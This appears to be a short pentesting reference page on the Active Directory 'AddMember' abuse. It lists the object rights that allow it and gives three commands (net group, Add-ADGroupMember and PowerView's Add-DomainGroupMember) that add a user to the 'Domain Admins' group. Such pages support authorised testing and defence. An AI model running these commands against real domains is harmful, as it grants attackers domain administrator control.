# AddMember

This abuse can be carried out when controlling an object that has `AllExtendedRights`, `Self`, `WriteProperty`, `GenericWrite` or `GenericAll` over a target group.

The attacker can add a user/group/computer to a group. This can be achieved with a native command line, with the Active Directory PowerShell module, or with [Add-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/) \([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module\).

```bash
# Command line ()
net group 'Domain Admins' 'user' /add /domain

# Powershell: Active Directory module
Add-ADGroupMember -Identity 'Domain Admins' -Members 'user'

# Powershell: PowerSploit module
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'user'
```

